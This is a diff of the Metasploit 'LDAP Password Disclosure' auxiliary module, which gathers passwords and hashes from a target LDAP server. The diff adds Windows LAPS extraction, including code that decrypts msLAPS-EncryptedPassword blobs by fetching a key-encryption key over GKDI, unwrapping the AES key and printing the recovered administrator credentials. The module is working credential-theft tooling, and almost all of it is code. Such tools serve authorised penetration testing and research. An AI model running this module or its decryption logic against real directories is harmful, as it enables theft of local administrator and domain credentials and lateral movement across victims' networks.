@@ -3,17 +3,22 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'rasn1'
+
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::MsGkdi
   include Msf::Exploit::Remote::LDAP
+  include Msf::Exploit::Remote::LDAP::Queries
   include Msf::OptionalSession::LDAP
 
   include Msf::Exploit::Deprecated
   moved_from 'auxiliary/gather/ldap_hashdump'
 
-  PASSWORD_ATTRIBUTES = %w[clearpassword mailuserpassword ms-mcs-admpwd password passwordhistory pwdhistory sambalmpassword sambantpassword userpassword userpkcs12]
+  LDAP_CAP_ACTIVE_DIRECTORY_OID = '1.2.840.113556.1.4.800'.freeze
+  PASSWORD_ATTRIBUTES = %w[clearpassword mailuserpassword mslaps-password mslaps-encryptedpassword ms-mcs-admpwd password passwordhistory pwdhistory sambalmpassword sambantpassword userpassword userpkcs12]
 
   def initialize(info = {})
     super(
@@ -21,26 +26,26 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'LDAP Password Disclosure',
         'Description' => %q{
-          This module will gather passwords and password hashes from a target LDAP server via multiple techniques.
+          This module will gather passwords and password hashes from a target LDAP server via multiple techniques
+          including Windows LAPS.
         },
         'Author' => [
           'Spencer McIntyre', # LAPS updates
+          'Thomas Seigneuret', # LAPS research
+          'Tyler Booth', # LAPS research
           'Hynek Petrak' # Discovery, module
         ],
         'References' => [
-          ['CVE', '2020-3952'],
-          ['URL', 'https://www.vmware.com/security/advisories/VMSA-2020-0006.html']
+          ['URL', 'https://blog.xpnsec.com/lapsv2-internals/'],
+          ['URL', 'https://github.com/fortra/impacket/blob/master/examples/GetLAPSPassword.py']
         ],
         'DisclosureDate' => '2020-07-23',
         'License' => MSF_LICENSE,
-        'Actions' => [
-          ['Dump', { 'Description' => 'Dump all LDAP data' }]
-        ],
-        'DefaultAction' => 'Dump',
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'SideEffects' => [IOC_IN_LOGS],
-          'Reliability' => []
+          'Reliability' => [],
+          'AKA' => ['GetLAPSPassword']
         }
       )
     )
@@ -48,9 +53,9 @@ class MetasploitModule < Msf::Auxiliary
     register_options([
       OptInt.new('READ_TIMEOUT', [false, 'LDAP read timeout in seconds', 600]),
       OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
-      OptString.new('USER_ATTR', [false, 'LDAP attribute(s), that contains username', '']),
+      OptString.new('USER_ATTR', [false, 'LDAP attribute, that contains username', '']),
       OptString.new('PASS_ATTR', [
-        false, 'Additional LDAP attribute(s) that contain password hashes',
+        false, 'Additional LDAP attribute(s) that contain passwords and password hashes',
         ''
         # Other potential candidates:
         # ipanthash, krbpwdhistory, krbmkey, unixUserPassword, krbprincipalkey, radiustunnelpassword, sambapasswordhistory
@@ -58,8 +63,63 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
-  def print_prefix
-    "#{peer.ljust(21)} - "
+  def session?
+    defined?(:session) && session
+  end
+
+  def get_ad_ds_domain_info(ldap)
+    vprint_status('Checking if the target LDAP server is an Active Directory Domain Controller...')
+
+    root_dse = ldap.search(
+      ignore_server_caps: true,
+      base: '',
+      scope: Net::LDAP::SearchScope_BaseObject,
+      attributes: %i[configurationNamingContext supportedCapabilities supportedExtension]
+    )&.first
+
+    unless root_dse[:supportedcapabilities].map(&:to_s).include?(LDAP_CAP_ACTIVE_DIRECTORY_OID)
+      print_status('The target LDAP server is not an Active Directory Domain Controller.')
+      return nil
+    end
+
+    unless root_dse[:supportedextension].include?(Net::LDAP::WhoamiOid)
+      print_status('The target LDAP server is not an Active Directory Domain Controller.')
+      return nil
+    end
+
+    print_status('The target LDAP server is an Active Directory Domain Controller.')
+
+    unless ldap.search(base: '', filter: '(objectClass=domain)').nil?
+      # this *should* never happen unless we're tricked into connecting on a different port but if it does happen it
+      # means we'll be getting information from more than one domain which breaks some core assumptions
+      # see: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc978012(v=technet.10)
+      fail_with(Msf::Module::Failure::NoTarget, 'The target LDAP server is a Global Catalog.')
+    end
+
+    # our_domain, _, our_username = ldap.ldapwhoami.to_s.delete_prefix('u:').partition('\\')
+
+    target_domains = ldap.search(
+      base: root_dse[:configurationnamingcontext].first.to_s,
+      filter: "(&(objectCategory=crossref)(nETBIOSName=*)(nCName=#{ldap.base_dn}))"
+    )
+    unless target_domains.present?
+      fail_with(Msf::Module::Failure::NotFound, 'The target LDAP server did not return its NETBIOS domain name.')
+    end
+
+    unless target_domains.length == 1
+      fail_with(Msf::Module::Failure::NotFound, "The target LDAP server returned #{target_domains.length} NETBIOS domain names.")
+    end
+
+    target_domain = target_domains.first
+
+    {
+      netbios_name: target_domain[:netbiosname].first.to_s,
+      dns_name: target_domain[:dnsroot].first.to_s
+    }
+  end
+
+  def ad_domain?
+    @ad_ds_domain_info.nil?
   end
 
   # PoC using ldapsearch(1):
@@ -89,6 +149,8 @@ class MetasploitModule < Msf::Auxiliary
         vprint_status("Using the '#{datastore['USER_ATTR']}' attribute as the username")
       end
 
+      @ad_ds_domain_info = get_ad_ds_domain_info(ldap)
+
       print_status("Searching base DN: #{base_dn}")
       entries_returned += ldap_search(ldap, base_dn, base: base_dn)
     end
@@ -106,10 +168,12 @@ class MetasploitModule < Msf::Auxiliary
   def ldap_search(ldap, base_dn, args)
     entries_returned = 0
     creds_found = 0
+    # TODO: use a filter when we're targeting AD DS
     def_args = {
-      base: '',
       return_result: false,
-      attributes: %w[* + -]
+      scope: Net::LDAP::SearchScope_WholeSubtree,
+      # build a filter that searches for any object that contains at least one of the attributes we're interested in
+      filter: "(|#{password_attributes.map { "(#{_1}=*)" }.join})"
     }
 
     begin
@@ -142,6 +206,7 @@ class MetasploitModule < Msf::Auxiliary
     attributes = PASSWORD_ATTRIBUTES.dup
     if datastore['PASS_ATTR'].present?
       attributes += datastore['PASS_ATTR'].split(/[,\s]+/).compact.reject(&:empty?).map(&:downcase)
+      attributes.uniq!
     end
 
     attributes
@@ -166,7 +231,7 @@ class MetasploitModule < Msf::Auxiliary
 
   def process_hash(entry, attr)
     creds_found = 0
-    username = [datastore['USER_ATTR'], 'sAMAccountName', 'dn', 'cn'].map { entry[_1] }.reject(&:blank?).first.first
+    username = [datastore['USER_ATTR'], 'sAMAccountName', 'uid', 'dn'].map { entry[_1] }.reject(&:blank?).first.first
 
     entry[attr].each do |private_data|
       if attr == 'pwdhistory'
@@ -212,6 +277,7 @@ class MetasploitModule < Msf::Auxiliary
       next if attr == 'sambapasswordhistory' && private_data =~ /^(0{64}|0{56})$/
 
       jtr_format = nil
+      annotation = ''
 
       case attr
       when 'sambalmpassword'
@@ -233,6 +299,29 @@ class MetasploitModule < Msf::Auxiliary
         # https://github.com/vmware/lightwave/blob/c4ad5a67eedfefe683357bc53e08836170528383/vmdir/thirdparty/heimdal/krb5-crypto/salt.c#L133-L175
         # In the meantime, dump the base64 encoded value.
         private_data = Base64.strict_encode64(private_data)
+      when 'ms-mcs-admpwd'
+        # LAPSv1 doesn't store the name of the local administrator anywhere in LDAP. It's technically configurable via Group Policy, but we'll  assume it's 'Administrator'.
+        username = 'Administrator'
+        annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['ms-mcs-admpwdexpirationtime'].first.to_i)})" if entry['ms-mcs-admpwdexpirationtime'].present?
+      when 'mslaps-password'
+        begin
+          lapsv2 = JSON.parse(private_data)
+        rescue StandardError => e
+          elog("Encountered an error while parsing LAPSv2 plain-text data for user '#{username}'.", error: e)
+          print_error("Encountered an error while parsing LAPSv2 plain-text data for user '#{username}'.")
+          next
+        end
+
+        username = lapsv2['n']
+        private_data = lapsv2['p']
+        annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['mslaps-passwordexpirationtime'].first.to_i)})" if entry['mslaps-passwordexpirationtime'].present?
+      when 'mslaps-encryptedpassword'
+        lapsv2 = process_result_lapsv2_encrypted(entry)
+        next if lapsv2.nil?
+
+        username = lapsv2['n']
+        private_data = lapsv2['p']
+        annotation = "(expires: #{convert_nt_timestamp_to_time_string(entry['mslaps-passwordexpirationtime'].first.to_i)})" if entry['mslaps-passwordexpirationtime'].present?
       when 'userpkcs12'
         # if we get non printable chars, encode into base64
         if (private_data =~ /[^[:print:]]/).nil?
@@ -270,8 +359,7 @@ class MetasploitModule < Msf::Auxiliary
 
       # highlight unresolved hashes
       jtr_format = '{crypt}' if private_data =~ /{crypt}/i
-
-      print_good("Credentials (#{jtr_format || 'password'}) found in #{attr}: #{username}:#{private_data}")
+      print_good("Credentials (#{jtr_format.blank? ? 'password' : jtr_format}) found in #{attr}: #{username}:#{private_data} #{annotation}")
 
       report_creds(username, private_data, jtr_format)
       creds_found += 1
@@ -300,7 +388,114 @@ class MetasploitModule < Msf::Auxiliary
       username: username
     }.merge(service_data)
 
+    if @ad_ds_domain_info
+      credential_data[:realm_key] = Metasploit::Model::Realm::Key::ACTIVE_DIRECTORY_DOMAIN
+      credential_data[:realm_value] = @ad_ds_domain_info[:dns_name]
+    end
+
     cl = create_credential_and_login(credential_data)
     cl.respond_to?(:core_id) ? cl.core_id : nil
+  end
+
+  def process_result_lapsv2_encrypted(result)
+    if session?
+      print_warning('Can not obtain LAPSv2 decryption keys when running with an existing session.')
+      return
+    end
+
+    encrypted_block = result['msLAPS-EncryptedPassword'].first
+
+    encrypted_blob = LAPSv2EncryptedPasswordBlob.read(encrypted_block)
+    content_info = Rex::Proto::CryptoAsn1::Cms::ContentInfo.parse(encrypted_blob.buffer.pack('C*'))
+    encrypted_data = encrypted_blob.buffer[content_info.to_der.bytesize...].pack('C*')
+    enveloped_data = content_info.enveloped_data
+    recipient_info = enveloped_data[:recipient_infos][0]
+    kek_identifier = recipient_info[:kekri][:kekid]
+
+    key_identifier = kek_identifier[:key_identifier]
+    key_identifier = GkdiGroupKeyIdentifier.read(key_identifier.value)
+
+    other_key_attribute = kek_identifier[:other]
+    unless other_key_attribute[:key_attr_id].value == '1.3.6.1.4.1.311.74.1'
+      vprint_error('msLAPS-EncryptedPassword parsing failed: Unexpected OtherKeyAttribute#key_attr_id OID.')
+      return
+    end
+
+    ms_key_attribute = MicrosoftKeyAttribute.parse(other_key_attribute[:key_attr].value)
+    kv_pairs = ms_key_attribute[:content][:content][:content][:kv_pairs]
+    sid = kv_pairs.value.find { |kv_pair| kv_pair[:name].value == 'SID' }[:value]&.value
+
+    sd = Rex::Proto::MsDtyp::MsDtypSecurityDescriptor.from_sddl_text(
+      "O:SYG:SYD:(A;;CCDC;;;#{sid})(A;;DC;;;WD)",
+      domain_sid: sid.rpartition('-').first
+    )
+
+    if @gkdi_client.nil?
+      @gkdi_client = connect_gkdi(username: datastore['LDAPUsername'], password: datastore['LDAPPassword'])
+    end
+
+    begin
+      kek = gkdi_get_kek(
+        client: @gkdi_client,
+        security_descriptor: sd,
+        key_identifier: key_identifier
+      )
+    rescue StandardError => e
+      elog('Failed to obtain the KEK from GKDI', error: e)
+      print_error("Failed to obtain the KEK from GKDI: #{e.class} - #{e}")
+      return nil
+    end
+
+    algorithm_identifier = content_info.enveloped_data[:encrypted_content_info][:content_encryption_algorithm]
+    algorithm_oid = Rex::Proto::CryptoAsn1::ObjectId.new(algorithm_identifier[:algorithm].value)
+    unless [Rex::Proto::CryptoAsn1::OIDs::OID_AES256_GCM, Rex::Proto::CryptoAsn1::OIDs::OID_AES256_GCM].include?(algorithm_oid)
+      vprint_error("msLAPS-EncryptedPassword parsing failed: Unexpected algorithm OID '#{algorithm_oid.value}'.")
+      return
+    end
+
+    iv = algorithm_identifier.gcm_parameters[:aes_nonce].value
+    encrypted_key = recipient_info[:kekri][:encrypted_key].value
+
+    key = Rex::Crypto::KeyWrap::NIST_SP_800_38f.aes_unwrap(kek, encrypted_key)
+
+    cipher = OpenSSL::Cipher::AES.new(key.length * 8, :GCM)
+    cipher.decrypt
+    cipher.key = key
+    cipher.iv_len = iv.length
+    cipher.iv = iv
+    cipher.auth_tag = encrypted_data[-16...]
+    plaintext = cipher.update(encrypted_data[...-16]) + cipher.final
+    JSON.parse(RubySMB::Field::Stringz16.read(plaintext).value)
+  end
+
+  # https://blog.xpnsec.com/lapsv2-internals/#:~:text=msLAPS%2DEncryptedPassword%20attribute
+  # https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/b6ea7b78-64da-48d3-87cb-2cff378e4597
+  class LAPSv2EncryptedPasswordBlob < BinData::Record
+    endian :little
+
+    file_time   :timestamp
+    uint32      :buffer_size
+    uint32      :flags
+    uint8_array :buffer, initial_length: :buffer_size
+  end
+
+  class MicrosoftKeyAttribute < RASN1::Model
+    class Sequence < RASN1::Model
+      class KVPairs < RASN1::Model
+        sequence :content, content: [
+          utf8_string(:name),
+          utf8_string(:value)
+        ]
+      end
+
+      sequence :content, constructed: true, content: [
+        sequence_of(:kv_pairs, KVPairs)
+      ]
+    end
+
+    sequence :content, content: [
+      objectid(:key_attr_id),
+      model(:key_attr, Sequence)
+    ]
   end
 end
